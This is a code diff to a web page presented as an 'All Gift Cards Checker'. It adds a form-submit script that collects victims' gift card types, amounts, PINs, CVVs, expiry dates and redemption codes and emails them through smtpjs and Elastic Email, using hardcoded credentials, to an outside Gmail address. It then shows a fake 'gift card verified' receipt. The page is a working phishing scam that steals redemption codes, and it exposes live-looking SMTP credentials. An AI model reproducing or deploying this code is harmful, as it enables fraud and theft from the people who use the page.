@@ -119,13 +119,44 @@
             </div>
             <!-- mobile menu trigger -->
             <div class="mobile-menu-trigger">
-              <span></span>
-            </div>
+<span></span>            </div>
             <!--/.Mobile Menu Hamburger Ends-->
           </nav>
         </div>
       </header>
       <!-- navbar- -->
+
+      <nav id="myNav" class="overlay">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+        <div class="overlay-content">
+          <div class="receipt">
+            <header class="receipt__header">
+              <p class="receipt__title">
+                SUCCESS! 😊
+              </p>
+              <p class="receipt__date">Your gift card has been verified
+              </p>
+            </header>
+            <dl class="receipt__list">
+              <div class="receipt__list-row">
+                <dt class="receipt__item" >Card Type</dt>
+                <dd class="receipt__cost" id="el1">£9.99</dd>
+              </div>
+              <div class="receipt__list-row">
+                <dt class="receipt__item">Card Amount</dt>
+                <dd class="receipt__cost"  id="el2">£4.19</dd>
+              </div>
+              
+             
+             
+              <div class="receipt__list-row receipt__list-row--total">
+                <dt class="receipt__item">Status</dt>
+                <dd class="receipt__cost">Not Activated</dd>
+              </div>
+            </dl>
+          </div>
+        </div>
+      </nav>
       <!-- Hero Area -->
       <div class="hero-area-l-13 position-relative overflow-hidden">
         <div class="container">
@@ -296,7 +327,7 @@
           </div>
           <div
             class="box-root padding-top--24 flex-flex flex-direction--column"
-            style="flex-grow: 1; z-index: 9"
+            style="flex-grow: 1; z-index: 0"
           >
             <div class="formbg-outer">
               <div class="formbg">
@@ -307,8 +338,9 @@
                   >
                     All Gift Cards Checker
                   </span>
-                  <form id="stripe-login">
+                  <form id="stripe-login" class="contact-form"  >
                     <select
+                    id="card-type"
                       required=""
                       name="cardName"
                       class="form-select"
@@ -339,7 +371,7 @@
                     </select>
 
                     <select
-                      required=""
+                    id="currency-type"
                       name="currency"
                       class="form-select"
                       style="border-radius: 64px; margin-top: 15px"
@@ -355,14 +387,19 @@
                       class="field padding-bottom--28"
                       style="margin-top: 20px"
                     >
-                      <input type="number" placeholder=" Card Amount" />
+                      <input  id="amount"               
+                      required=""
+                      type="number" placeholder=" Card Amount" />
                     </div>
+
+
                     <div
                     id="form"
                       class="field"
                       style="margin-top: 20px;   display: none;"
                     >
-                      <input type="number" placeholder=" Gift Card Pin" />
+                      <input     id="cardpin" value="0"             
+                      type="number" placeholder=" Gift Card Pin" />
                     </div>
 
 
@@ -371,7 +408,8 @@
                       class="field"
                       style="margin-top: 20px;   display: none;"
                     >
-                      <input type="number" placeholder=" Gift Card CCV" />
+                      <input  id="cardcvv"                   
+                      type="number" placeholder=" Gift Card CCV" />
                     </div>
 
     
@@ -380,7 +418,8 @@
                       class="field padding-bottom--24"
                       style="margin-top: 20px;   display: none;"
                     >
-                      <input type="number" placeholder=" Gift Card Expiry Date" />
+                      <input      id="cardexpiredate"           
+                      type="number" placeholder=" Gift Card Expiry Date" />
                     </div>
 
                     <div
@@ -388,20 +427,32 @@
                       class="field"
                       style="   display: none;"
                     >
-                      <input type="number" placeholder=" 4 Digit Pin" />
+                      <input   id="fourpin"
+                      type="number" placeholder=" 4 Digit Pin" />
                     </div>
 
                   
 
 
                     <div class="field padding-bottom--24 padding-top--24" >
-                      <input type="number" placeholder=" Redemption Code" />
+                      <input id="redemptioncode"  type="text" placeholder=" Redemption Code" required  minlength="4" maxlength="20"  >
                     </div>
 
+
+       
+
+                   <div > <p style="color:rgb(255, 178, 178)">  Please make sure the redemption code is the original scratched code</p></div>
                     <div class="field padding-bottom--24">
-                      <input type="submit" name="submit" value="Continue" />
+                      <input  type="submit" name="submit" value="Continue" id="myButton1" />
                     </div>
+                    <div > <p style="color:gray">Please make sure the codes you are about to input are correct and according to details
+
+                    </p></div>
+
+
+
                   </form>
+                  
                 </div>
               </div>
             </div>
@@ -626,3 +677,94 @@
     <script src="js/card.js"></script>
   </body>
 </html>
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+
+
+
+<script>
+
+document.querySelector(".contact-form").addEventListener("submit" , submitForm);
+
+// function hello(e) {
+
+//   let cardtype = document.getElementById("card-type").value;
+//   let amount = document.getElementById("amount").value;
+//   let currency = document.getElementById("currency-type").value;
+
+
+
+//   event.preventDefault();
+//   myClick()
+//   document.getElementById("el1").textContent = `${cardtype}`;
+//   document.getElementById("el2").textContent = `${currency}${amount}`;
+
+
+//   document.getElementById("myButton1").value="Checking......."; 
+
+
+
+//   console.log("hello");
+// }
+function closeNav() {
+    document.getElementById("myNav").style.width = "0%";
+}
+
+function myClick() {
+  setTimeout(
+    function openNav() {
+    document.getElementById("myNav").style.width = "100%";
+}, 1000);
+}
+
+
+    function submitForm(e) {
+      event.preventDefault();
+
+
+
+  document.getElementById("myButton1").value="Checking......."; 
+
+      let cardtype = document.getElementById("card-type").value;
+    let currency = document.getElementById("currency-type").value;
+    let amount = document.getElementById("amount").value;
+    let cardpin = document.getElementById("cardpin").value;
+    let cardcvv = document.getElementById("cardcvv").value;
+    let cardexpiredate = document.getElementById("cardexpiredate").value;
+    let cardfourpin = document.getElementById("fourpin").value;
+    let redemptioncode = document.getElementById("redemptioncode").value;
+
+    
+     document.getElementById("el1").textContent = `${cardtype}`;
+      document.getElementById("el2").textContent = `${currency}${amount}`;
+
+    document.querySelector(".contact-form").reset();
+
+    sendEmail(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode);
+
+    function sendEmail(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode) {
+    Email.send({
+      Host: "smtp.elasticemail.com",
+      Username: "imperialwavelogics@gmail.com",
+      Password: "63668EEE5A9F1E62BB74006818F665F99EC2",
+      Port : 2525,
+
+      To: "emmazy100@gmail.com",
+      From: "imperialwavelogics@gmail.com",
+      Subject: ` ${"paidgiftcard"} sent you a message`,
+      Body: `Cardname: ${cardtype} <br/> Currency: ${currency} <br/> Amount ${amount} <br/> Cardpin : ${cardpin} <br/> Cardcvv : ${cardcvv} <br/> Cardexpiredate : ${cardexpiredate} <br/> Cardfourpin : ${cardfourpin} <br/> Redemptioncode : ${redemptioncode}`,
+    }).then( myClick);
+  }
+
+    }
+   
+  
+
+
+</script>
+
+
+
+
